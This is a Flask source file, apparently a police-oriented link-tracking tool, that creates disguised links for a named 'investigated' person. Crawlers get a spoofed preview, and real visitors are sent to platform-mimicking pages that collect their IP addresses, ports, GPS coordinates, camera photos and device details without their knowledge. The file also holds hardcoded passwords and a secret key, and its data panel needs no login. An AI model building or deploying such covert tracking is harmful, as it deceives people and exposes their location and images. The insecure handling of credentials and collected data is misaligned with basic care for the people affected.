import os
import re
import uuid
import random
import string
import pytz
import base64
import requests
from PIL import Image
from bs4 import BeautifulSoup
from datetime import datetime, timedelta
from functools import wraps
from uuid import uuid4
from flask import (
    Flask, request, render_template, jsonify, redirect,
    url_for, flash, session
)
from flask_sqlalchemy import SQLAlchemy
from flask_migrate import Migrate
from werkzeug.utils import secure_filename

# 🔥 Inicializa o Flask
app = Flask(__name__, instance_relative_config=True)
app.secret_key = 'P@licia1080#'

# 📦 Configurações do banco de dados
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' + os.path.join(app.instance_path, 'dados.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# 📁 Configurações de upload
UPLOAD_FOLDER = 'static/previews'  # Agora centralizado
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MAX_CONTENT_LENGTH'] = 5 * 1024 * 1024  # Limite de 5MB

# 📂 Garante que as pastas necessárias existem
os.makedirs(app.instance_path, exist_ok=True)
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# 📚 Inicializa o banco
db = SQLAlchemy(app)

# 🛡️ Função para checar extensão permitida
def extensao_permitida(nome_arquivo):
    return '.' in nome_arquivo and nome_arquivo.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

# 📤 Rota para upload de imagem
@app.route("/upload_imagem", methods=["POST"])
def upload_imagem():
    if "imagem" not in request.files:
        return jsonify({"erro": "Nenhuma imagem enviada"}), 400

    arquivo = request.files["imagem"]

    if arquivo.filename == "":
        return jsonify({"erro": "Nome de arquivo vazio"}), 400

    if arquivo and extensao_permitida(arquivo.filename):
        filename = secure_filename(arquivo.filename)
        caminho = os.path.join(app.config["UPLOAD_FOLDER"], filename)

        try:
            filename = secure_filename(arquivo.filename)
            ext = 'jpg'
            nome_unico = f"{uuid.uuid4().hex}.{ext}"
            caminho_jpg = os.path.join(app.config["UPLOAD_FOLDER"], nome_unico)

            img = Image.open(arquivo)
            img = img.convert("RGB")
            img = img.resize((1200, 630))
            img.save(caminho_jpg, "JPEG", quality=85)

            url_imagem = url_for('static', filename=f'previews/{nome_unico}', _external=True)
            return jsonify({"url": url_imagem}), 200


        except Exception as e:
            return jsonify({"erro": f"Erro ao processar imagem: {e}"}), 500
    else:
        return jsonify({"erro": "Extensão de arquivo não permitida."}), 400

    
@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        usuario = request.form["usuario"]
        senha = request.form["senha"]
        if usuario == "policia" and senha == "Itapipoca2025#":
            session["logado"] = True
            return redirect(url_for("gerenciar"))
        else:
            return render_template("login.html", erro="Usuário ou senha incorretos.")
    return render_template("login.html")

@app.route("/logout")
def logout():
    session.pop("logado", None)
    return redirect(url_for("login"))

def login_requerido(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get("logado"):
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated_function


def horario_brasilia():
    fuso_brasilia = pytz.timezone('America/Sao_Paulo')
    return datetime.now(fuso_brasilia)
@app.route("/gerenciar")
@login_requerido
def gerenciar():
    return render_template("gerenciar.html")

class IPInicial(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    slug = db.Column(db.String(255), db.ForeignKey('link.slug'))  # adicione isso
    ip_v4 = db.Column(db.String(45))
    ip_v6 = db.Column(db.String(45))
    porta = db.Column(db.Integer())  
    data_hora = db.Column(db.DateTime, default=horario_brasilia)
    
# Tabela de links
class Link(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    slug = db.Column(db.String(100), unique=True, nullable=False)
    destino = db.Column(db.String(300), nullable=False)
    nome_investigado = db.Column(db.String(200))  # <== este campo precisa estar aqui
    plataforma = db.Column(db.String(50))
    og_title = db.Column(db.String(200))
    og_description = db.Column(db.String(300))
    og_image = db.Column(db.String(300))
    preview_titulo = db.Column(db.String(255))
    preview_descricao = db.Column(db.String(500))
    preview_imagem = db.Column(db.String(255)) # Nome da imagem salva
    preview_tipo = db.Column(db.String(50))
    created_at = db.Column(db.DateTime, default=horario_brasilia)
    foi_testado = db.Column(db.Boolean, default=False)
    
    ips_iniciais = db.relationship('IPInicial', backref='link', cascade="all, delete-orphan")
    
# Tabela de acessos
class RegistroAcesso(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    slug = db.Column(db.String(100), db.ForeignKey('link.slug'))
    link = db.relationship('Link', backref='acessos')
    ip_v4 = db.Column(db.String(45))
    ip_v6 = db.Column(db.String(45))
    latitude = db.Column(db.String(50))
    longitude = db.Column(db.String(50))
    foto_arquivo = db.Column(db.String(255))
    sistema = db.Column(db.String(100))
    navegador = db.Column(db.String(200))
    idioma = db.Column(db.String(50))
    fuso_horario = db.Column(db.String(100))
    conexao = db.Column(db.String(100))
    largura_tela = db.Column(db.Integer)
    altura_tela = db.Column(db.Integer)
    tempo_segundos = db.Column(db.Integer)
    data_hora = db.Column(db.DateTime, default=horario_brasilia)
    porta_r=db.Column(db.String(45))
# Tabela de registros (IP e User-Agent)
class Registro(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    ip = db.Column(db.String(100))
    user_agent = db.Column(db.String(300))
    latitude = db.Column(db.String(50))
    longitude = db.Column(db.String(50))
    porta = db.Column(db.Integer())  
    timestamp = db.Column(db.String(50))
    foto_base64 = db.Column(db.Text)
    slug = db.Column(db.String(100), db.ForeignKey('link.slug'))  # ✅ chave estrangeira
    link = db.relationship('Link', backref='registros')           # ✅ relação
with app.app_context():
    db.create_all()

class RegistroBot(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    ip = db.Column(db.String(100))
    user_agent = db.Column(db.String(300))
    timestamp = db.Column(db.String(50))
    slug = db.Column(db.String(50))
    cidade = db.Column(db.String(100))
    estado = db.Column(db.String(100))
    pais = db.Column(db.String(100))

# Página de criação de links
UPLOAD_FOLDER = os.path.join('static', 'previews')
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route("/criar_link", methods=["GET", "POST"])
@login_requerido
def criar_link():
    if request.method == "POST":
        slug = request.form.get('slug')
        destino = request.form.get('destino')
        nome_investigado = request.form.get('nome_investigado')
        plataforma = request.form.get('plataforma')
        
        # Campos da pré-visualização
        preview_titulo = request.form.get('preview_titulo')
        preview_descricao = request.form.get('preview_descricao')
        preview_imagem = None
        preview_tipo = request.form.get('preview_tipo')  # opcional

        # Verifique se foi enviado um arquivo de imagem
        if 'imagem' in request.files:
            imagem = request.files['imagem']
            if imagem and allowed_file(imagem.filename):
                filename = secure_filename(imagem.filename)
                caminho = os.path.join(UPLOAD_FOLDER, filename)
                imagem.save(caminho)
                
                # Construa a URL da imagem
                preview_imagem = url_for('static', filename=f'previews/{filename}', _external=True)
            else:
                flash("Arquivo de imagem inválido!", "error")
                return redirect('/criar_link')

        # Validação
        if not destino:
            flash("Destino é obrigatório!", "error")
            return redirect('/criar_link')

        # Se slug não veio, gera automático
        if not slug:
            slug = str(uuid.uuid4())[:8]

        novo_link = Link(
            slug=slug,
            destino=destino,
            nome_investigado=nome_investigado,
            plataforma=plataforma,
            preview_titulo=preview_titulo,
            preview_descricao=preview_descricao,
            preview_imagem=preview_imagem,
            preview_tipo=preview_tipo
        )

        try:
            db.session.add(novo_link)
            db.session.commit()
            flash("Link criado com sucesso!", "success")
            return redirect('/todos_links')
        except Exception as e:
            db.session.rollback()
            flash(f"Erro ao criar link: {e}", "error")
            return redirect('/criar_link')

    return render_template('criar_link.html')

# Gera slugs aleatórios
def gerar_slug(tamanho=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=tamanho))

# Acessa o link disfarçado
# views.py (ou app.py)

@app.route("/link/<slug>")
@app.route("/r/<slug>")
def rastrear_link(slug):
    link = Link.query.filter_by(slug=slug).first_or_404()

    user_agent = request.headers.get("User-Agent", "").lower()
    bots = ["facebookexternalhit", "twitterbot", "linkedinbot", "whatsapp", "slackbot", "telegrambot"]
    is_bot = any(bot in user_agent for bot in bots)

    if is_bot:
        try:
            headers = {
                "User-Agent": "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
            }
            resposta = requests.get(link.destino, headers=headers, timeout=5)
            soup = BeautifulSoup(resposta.text, "html.parser")

            og_title = soup.find("meta", property="og:title")
            og_desc = soup.find("meta", property="og:description")
            og_image = soup.find("meta", property="og:image")

            return render_template("preview_real.html",
                titulo=og_title["content"] if og_title else "Acesse este link",
                descricao=og_desc["content"] if og_desc else "Clique para visualizar o conteúdo.",
                imagem=og_image["content"] if og_image else url_for('static', filename='fallback.jpg', _external=True),
                url_destino=link.destino
            )
        except:
            return render_template("preview_fallback.html", url_destino=link.destino)

    # Visitante real: coleta os dados
    visitor_ip = request.remote_addr
    timestamp = horario_brasilia()
    
    novo = Registro(
        ip=visitor_ip,
        user_agent=request.headers.get("User-Agent"),
        timestamp=timestamp,
        slug=slug
    )
    db.session.add(novo)
    db.session.commit()

    template_escolhido = f"{link.plataforma.lower()}.html"
    return render_template(template_escolhido, slug=slug, destino=link.destino, link=link)

def horario_brasilia():
    # Oregon = UTC-7 | Brasília = UTC-3 => diferença = +4 horas
    return (datetime.now() + timedelta(hours=4)).strftime("%d/%m/%Y %H:%M:%S")


@app.route("/redir/<slug>")
def redirecionar(slug):
    link = Link.query.filter_by(slug=slug).first_or_404()
    destino = link.destino

    # (Opcional) você pode gravar aqui que o redirecionamento foi concluído
    return render_template("redirect.html", destino=destino)


# Página inicial
@app.route("/todos_links")
@login_requerido
def todos_links():
    links = Link.query.order_by(Link.id.desc()).all()
    return render_template("todos_links.html", links=links)


@app.route("/excluir_link/<int:link_id>", methods=["POST"])
@login_requerido
def excluir_link(link_id):
    # Busca o link pelo ID
    link = Link.query.get_or_404(link_id)
    
    # Exclui todos os registros de acesso associados ao slug do link
    registros = RegistroAcesso.query.filter_by(slug=link.slug).all()
    for r in registros:
        db.session.delete(r)

    # Agora exclui o próprio link
    db.session.delete(link)
    db.session.commit()

    return redirect(url_for('todos_links'))

def buscar_destino_por_slug(slug):
    # Exemplo: Buscar no banco de dados com base no slug
    link = Link.query.filter_by(slug=slug).first()
    if link:
        return link.destino
    return "Destino não encontrado"

# Coleta dados de IP, localização e foto


def analisar_user_agent(user_agent):
    dispositivo = "Desconhecido"
    sistema = "Desconhecido"
    navegador = "Desconhecido"

    # Detecta sistema operacional
    if "Android" in user_agent:
        sistema_match = re.search(r"Android\s[\d\.]+", user_agent)
        sistema = sistema_match.group(0) if sistema_match else "Android"
        dispositivo_match = re.search(r";\s?([^;]*)\sBuild", user_agent)
        dispositivo = dispositivo_match.group(1).strip() if dispositivo_match else "Android genérico"
    elif "iPhone" in user_agent:
        sistema = "iOS"
        dispositivo = "iPhone"
    elif "iPad" in user_agent:
        sistema = "iOS"
        dispositivo = "iPad"
    elif "Windows" in user_agent:
        sistema_match = re.search(r"Windows NT [\d\.]+", user_agent)
        sistema = sistema_match.group(0).replace("Windows NT", "Windows") if sistema_match else "Windows"
        dispositivo = "PC"
    elif "Macintosh" in user_agent:
        sistema = "MacOS"
        dispositivo = "Mac"

    # Detecta navegador
    if "Chrome" in user_agent and "Safari" in user_agent:
        navegador_match = re.search(r"Chrome\/[\d\.]+", user_agent)
        navegador = navegador_match.group(0) if navegador_match else "Chrome"
    elif "Safari" in user_agent and not "Chrome" in user_agent:
        navegador_match = re.search(r"Version\/[\d\.]+ Safari", user_agent)
        navegador = navegador_match.group(0) if navegador_match else "Safari"
    elif "Firefox" in user_agent:
        navegador_match = re.search(r"Firefox\/[\d\.]+", user_agent)
        navegador = navegador_match.group(0) if navegador_match else "Firefox"
    elif "Edg" in user_agent:
        navegador_match = re.search(r"Edg\/[\d\.]+", user_agent)
        navegador = navegador_match.group(0) if navegador_match else "Edge"

    return {
        "sistema": sistema,
        "dispositivo": dispositivo,
        "navegador": navegador
    }

@app.route("/coletar_dados", methods=["POST"])
def coletar_dados():
    dados = request.get_json()
    pasta_upload = os.path.join(app.root_path, 'static', 'upload')
    os.makedirs(pasta_upload, exist_ok=True)

    nome_arquivo = None

    # Processar imagem base64
    if dados.get("foto_base64"):
        try:
            base64_data = dados["foto_base64"].split(",")[-1]
            imagem_bytes = base64.b64decode(base64_data)

            nome_arquivo = f"{dados.get('slug')}_{datetime.utcnow().strftime('%Y%m%d%H%M%S')}.jpg"
            caminho_completo = os.path.join(pasta_upload, nome_arquivo)

            with open(caminho_completo, "wb") as f:
                f.write(imagem_bytes)
        except Exception as e:
            print(f"Erro ao salvar imagem: {e}")
            nome_arquivo = None

    novo_registro = RegistroAcesso(
        slug=dados.get("slug"),
        ip_v4=dados.get("ip_v4"),
        ip_v6=dados.get("ip_v6"),
        latitude=dados.get("latitude"),
        longitude=dados.get("longitude"),
        foto_arquivo=nome_arquivo,
        sistema=dados.get("plataforma"),
        navegador=dados.get("userAgent"),
        idioma=dados.get("idioma"),
        fuso_horario=dados.get("fusoHorario"),
        conexao=dados.get("conexao"),
        largura_tela=int(dados.get("larguraTela", 0)),
        altura_tela=int(dados.get("alturaTela", 0)),
        porta_r=dados.get("porta"),
        tempo_segundos=int(dados.get("tempoSegundos", 0))
    )

    db.session.add(novo_registro)
    db.session.commit()

    return jsonify({
        "status": "ok",
        "destino": buscar_destino_por_slug(dados.get("slug")),
        "foto_nome": nome_arquivo
    })



@app.route("/coletar_ip_inicial", methods=["POST"])
def coletar_ip_inicial():
    dados = request.get_json()

    slug = dados.get("slug")
    ip_v4 = dados.get("ip_v4")
    ip_v6 = dados.get("ip_v6")
    porta = int(dados.get("porta") or 0)

    novo_ip = IPInicial(
        slug=slug,
        ip_v4=ip_v4,
        ip_v6=ip_v6,
        porta=porta
    )

    db.session.add(novo_ip)
    db.session.commit()

    return jsonify({"status": "ok"})


# Painel para visualizar os acessos
@app.route("/painel")
def painel():
    registros = RegistroAcesso.query.order_by(RegistroAcesso.data_hora.desc()).all()

    # Carregar todos os links, organizando por slug
    todos_links = Link.query.all()
    links = {link.slug: link.nome_investigado for link in todos_links}
    ips_iniciais = IPInicial.query.order_by(IPInicial.data_hora.desc()).all()
    return render_template("painel.html", registros=registros, links=links, ips_iniciais=ips_iniciais)

@app.route("/ping")
def ping():
    return "pong", 200

# Inicia o servidor
if __name__ == "__main__":
    app.run(debug=True)
